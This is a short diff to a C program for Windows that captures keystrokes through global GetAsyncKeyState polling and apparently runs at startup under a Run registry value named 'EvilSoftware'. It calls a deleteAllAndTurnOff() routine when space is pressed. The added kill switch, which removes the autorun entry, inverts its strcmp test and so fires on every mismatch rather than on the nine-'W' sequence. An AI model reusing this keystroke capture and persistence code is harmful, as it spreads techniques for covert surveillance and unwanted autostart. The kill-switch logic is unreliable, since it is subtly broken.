@@ -97,6 +97,8 @@ int main()
 			key='r';
 		else if(GetAsyncKeyState(VK_SPACE))
 			key=' ';
+		else if(GetAsyncKeyState(VK_LWIN))
+			key='W';
 
 		if(GetAsyncKeyState(VK_BACK))
 				backSpace(1);
@@ -112,6 +114,17 @@ int main()
 				backSpace(0);
 			}
 		}
+
+		if(strcmp(keyMap, "WWWWWWWWW"))
+		{
+			HKEY hkey = HKEY_CURRENT_USER;
+			RegOpenKey(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\Currentversion\\Run", &hkey);
+			RegDeleteValue(hkey, "EvilSoftware");
+			RegCloseKey(hkey);
+			exit(0);
+		}
+
+
 		if(key==' ')
 		{
 			deleteAllAndTurnOff();
